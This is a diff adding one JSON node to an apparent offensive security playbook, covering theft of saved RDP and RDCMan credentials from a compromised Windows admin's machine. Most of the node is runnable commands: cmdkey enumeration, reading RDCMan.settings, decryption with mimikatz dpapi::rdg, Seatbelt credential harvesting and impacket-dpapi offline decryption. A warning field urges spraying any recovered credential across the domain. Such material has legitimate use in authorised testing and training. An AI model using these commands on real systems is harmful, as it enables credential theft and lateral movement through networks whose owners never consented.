@@ -1,0 +1,26 @@
+{
+  "id": "rdcman_creds",
+  "phase": "CREDS",
+  "title": "RDCMan / RDP Saved Creds \u2014 DPAPI Decrypt",
+  "body": "Remote Desktop Connection Manager (RDCMan) and saved .rdp files stash credentials for other hosts \u2014 encrypted with the user's DPAPI master key. If you land on an admin's box, RDCMan.settings is a goldmine: it often holds creds to servers you can't otherwise reach, including the DC. This is a classic 'foothold user was a sysadmin' win \u2014 their saved connections ARE your lateral movement map.\n\nWhere to look:\n  %LOCALAPPDATA%\\Microsoft\\Remote Desktop Connection Manager\\RDCMan.settings\n  %USERPROFILE%\\Documents\\*.rdp  (saved RDP files with 'password 51:b:' blobs)\n  Credential Manager (cmdkey /list) \u2014 saved RDP/domain creds\n\nThe creds are DPAPI-encrypted to the USER. You need either (a) that user's context (a shell as them), or (b) their DPAPI masterkey + the blob to decrypt offline. Running as the user is the easy path \u2014 mimikatz dpapi::rdg does it in-session.",
+  "cmd": "# \u2550\u2550\u2550\u2550\u2550\u2550\u2550\u2550\u2550\u2550\u2550\u2550\u2550\u2550\u2550\u2550\u2550\u2550\u2550\u2550\u2550\u2550\u2550\u2550\u2550\u2550\u2550\u2550\u2550\u2550\u2550\u2550\u2550\u2550\u2550\u2550\u2550\u2550\u2550\u2550\u2550\u2550\u2550\u2550\u2550\u2550\u2550\u2550\u2550\u2550\u2550\u2550\u2550\u2550\n# FIND SAVED RDP / RDCMAN CREDENTIALS\n# \u2550\u2550\u2550\u2550\u2550\u2550\u2550\u2550\u2550\u2550\u2550\u2550\u2550\u2550\u2550\u2550\u2550\u2550\u2550\u2550\u2550\u2550\u2550\u2550\u2550\u2550\u2550\u2550\u2550\u2550\u2550\u2550\u2550\u2550\u2550\u2550\u2550\u2550\u2550\u2550\u2550\u2550\u2550\u2550\u2550\u2550\u2550\u2550\u2550\u2550\u2550\u2550\u2550\u2550\n# Saved RDP creds in Credential Manager (fast first check):\ncmdkey /list\n#   Look for 'Target: Domain:target=TERMSRV/<host>' entries.\n#   These can be REUSED without cracking: runas /savecred, or\n#   mstsc with the saved cred, or seatbelt below to extract.\n\n# RDCMan settings file:\ndir /s /b \"%LOCALAPPDATA%\\Microsoft\\Remote Desktop Connection Manager\\RDCMan.settings\"\ntype \"%LOCALAPPDATA%\\Microsoft\\Remote Desktop Connection Manager\\RDCMan.settings\"\n\n# Saved .rdp files (password 51:b: = DPAPI blob):\ndir /s /b %USERPROFILE%\\*.rdp\n\n# \u2550\u2550\u2550\u2550\u2550\u2550\u2550\u2550\u2550\u2550\u2550\u2550\u2550\u2550\u2550\u2550\u2550\u2550\u2550\u2550\u2550\u2550\u2550\u2550\u2550\u2550\u2550\u2550\u2550\u2550\u2550\u2550\u2550\u2550\u2550\u2550\u2550\u2550\u2550\u2550\u2550\u2550\u2550\u2550\u2550\u2550\u2550\u2550\u2550\u2550\u2550\u2550\u2550\u2550\n# DECRYPT \u2014 in the USER's context (easiest)\n# \u2550\u2550\u2550\u2550\u2550\u2550\u2550\u2550\u2550\u2550\u2550\u2550\u2550\u2550\u2550\u2550\u2550\u2550\u2550\u2550\u2550\u2550\u2550\u2550\u2550\u2550\u2550\u2550\u2550\u2550\u2550\u2550\u2550\u2550\u2550\u2550\u2550\u2550\u2550\u2550\u2550\u2550\u2550\u2550\u2550\u2550\u2550\u2550\u2550\u2550\u2550\u2550\u2550\u2550\n# mimikatz decrypts RDCMan.settings directly if you're that user:\n.\\mimikatz.exe \"dpapi::rdg /in:\\\"%LOCALAPPDATA%\\Microsoft\\Remote Desktop Connection Manager\\RDCMan.settings\\\" /unprotect\" \"exit\"\n\n# Seatbelt harvests RDP saved sessions + cmdkey creds:\n.\\Seatbelt.exe RDPSavedConnections RDCManFiles CredEnum\n\n# \u2550\u2550\u2550\u2550\u2550\u2550\u2550\u2550\u2550\u2550\u2550\u2550\u2550\u2550\u2550\u2550\u2550\u2550\u2550\u2550\u2550\u2550\u2550\u2550\u2550\u2550\u2550\u2550\u2550\u2550\u2550\u2550\u2550\u2550\u2550\u2550\u2550\u2550\u2550\u2550\u2550\u2550\u2550\u2550\u2550\u2550\u2550\u2550\u2550\u2550\u2550\u2550\u2550\u2550\n# DECRYPT \u2014 offline with the DPAPI masterkey (if not in-session)\n# \u2550\u2550\u2550\u2550\u2550\u2550\u2550\u2550\u2550\u2550\u2550\u2550\u2550\u2550\u2550\u2550\u2550\u2550\u2550\u2550\u2550\u2550\u2550\u2550\u2550\u2550\u2550\u2550\u2550\u2550\u2550\u2550\u2550\u2550\u2550\u2550\u2550\u2550\u2550\u2550\u2550\u2550\u2550\u2550\u2550\u2550\u2550\u2550\u2550\u2550\u2550\u2550\u2550\u2550\n# See the dpapi node for masterkey extraction. Once you have the\n# plaintext masterkey, decrypt the blob remotely:\nimpacket-dpapi rdg -file RDCMan.settings -key 0x<decrypted-masterkey>",
+  "warn": "RDCMan/RDP creds are DPAPI-bound to the USER, not the machine \u2014 you can only decrypt them in that user's context or with their masterkey. cmdkey /list is the fastest check and those saved creds are often reusable with runas /savecred WITHOUT decrypting. This is a 'sysadmin foothold' jackpot: their saved connections map the internal network for you. Always spray any recovered cred across the domain (nxc) \u2014 admins reuse.",
+  "choices": [
+    {
+      "label": "Got creds \u2014 spray / reuse across the domain",
+      "next": "cred_reuse"
+    },
+    {
+      "label": "Need the DPAPI masterkey first",
+      "next": "dpapi"
+    },
+    {
+      "label": "Recovered a working cred \u2014 lateral movement",
+      "next": "lateral_movement"
+    },
+    {
+      "label": "Back to Windows post-ex",
+      "next": "windows_post_exploit"
+    }
+  ]
+}
